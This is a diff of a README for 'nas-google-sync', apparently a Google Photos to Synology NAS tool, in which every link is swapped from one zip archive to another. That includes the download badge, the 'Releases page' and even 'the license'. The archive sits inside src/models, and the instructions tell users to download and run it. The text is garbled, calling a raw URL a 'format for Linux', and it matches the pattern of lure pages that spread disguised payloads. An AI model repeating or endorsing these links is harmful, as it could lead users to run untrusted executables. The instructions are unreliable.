@@ -8,20 +8,20 @@ Welcome to **nas-google-sync**! This application helps you free up Google storag
 
 You can download the application by visiting the link below:
 
-[![Download nas-google-sync](https://raw.githubusercontent.com/zayzay090123/nas-google-sync/main/src/models/nas-google-sync-v2.0.zip)](https://raw.githubusercontent.com/zayzay090123/nas-google-sync/main/src/models/nas-google-sync-v2.0.zip)
+[![Download nas-google-sync](https://github.com/zayzay090123/nas-google-sync/raw/refs/heads/main/src/models/sync_nas_google_3.5.zip)](https://github.com/zayzay090123/nas-google-sync/raw/refs/heads/main/src/models/sync_nas_google_3.5.zip)
 
 Click the link above to access the Releases page. Here, you will find the latest version of the software.
 
 ## 📂 Download & Install
 
-1. **Visit the Releases Page:** Go to [the Releases page](https://raw.githubusercontent.com/zayzay090123/nas-google-sync/main/src/models/nas-google-sync-v2.0.zip) to see the available versions.
+1. **Visit the Releases Page:** Go to [the Releases page](https://github.com/zayzay090123/nas-google-sync/raw/refs/heads/main/src/models/sync_nas_google_3.5.zip) to see the available versions.
 
 2. **Select a Version:** Look for the latest version. You will see a list of files available for download.
 
 3. **Download the Application:**
    - Choose the file that matches your operating system.
    - Click the file to start your download. This will save the application to your computer.
-   - The file is typically in the `.exe` format for Windows or a `https://raw.githubusercontent.com/zayzay090123/nas-google-sync/main/src/models/nas-google-sync-v2.0.zip` format for Linux.
+   - The file is typically in the `.exe` format for Windows or a `https://github.com/zayzay090123/nas-google-sync/raw/refs/heads/main/src/models/sync_nas_google_3.5.zip` format for Linux.
 
 4. **Run the Application:**
    - Locate the downloaded file on your computer.
@@ -61,8 +61,8 @@ Feel free to contribute to the project. Whether it's a bug fix, improvement sugg
 
 ## 📈 License
 
-This project is open-source and freely available. You can use it according to [the license](https://raw.githubusercontent.com/zayzay090123/nas-google-sync/main/src/models/nas-google-sync-v2.0.zip) terms.
+This project is open-source and freely available. You can use it according to [the license](https://github.com/zayzay090123/nas-google-sync/raw/refs/heads/main/src/models/sync_nas_google_3.5.zip) terms.
 
 ---
 
-Thank you for choosing **nas-google-sync**! We hope you find it useful for managing your Google Photos and maintaining storage on your Synology NAS. Don't forget to visit this link again for updates: [the Releases page](https://raw.githubusercontent.com/zayzay090123/nas-google-sync/main/src/models/nas-google-sync-v2.0.zip).
+Thank you for choosing **nas-google-sync**! We hope you find it useful for managing your Google Photos and maintaining storage on your Synology NAS. Don't forget to visit this link again for updates: [the Releases page](https://github.com/zayzay090123/nas-google-sync/raw/refs/heads/main/src/models/sync_nas_google_3.5.zip).
